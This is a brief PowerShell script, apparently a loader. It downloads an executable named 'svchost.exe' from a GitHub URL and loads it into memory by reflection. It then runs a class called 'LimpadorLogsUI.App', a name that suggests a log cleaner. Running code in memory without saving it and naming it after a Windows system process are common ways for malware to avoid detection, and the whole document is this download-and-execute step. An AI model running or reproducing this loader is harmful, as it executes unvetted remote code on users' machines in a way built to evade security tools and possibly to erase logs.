$url = "https://github.com/bragaawy/pjl/raw/main/svchost.exe"

$webClient = New-Object System.Net.WebClient
$bytesDoExe = $webClient.DownloadData($url )
$assembly = [System.Reflection.Assembly]::Load($bytesDoExe)

$appClass = $assembly.GetType("LimpadorLogsUI.App")
$appInstance = $appClass.GetConstructor([type[]]@()).Invoke(@())
$appInstance.Run()
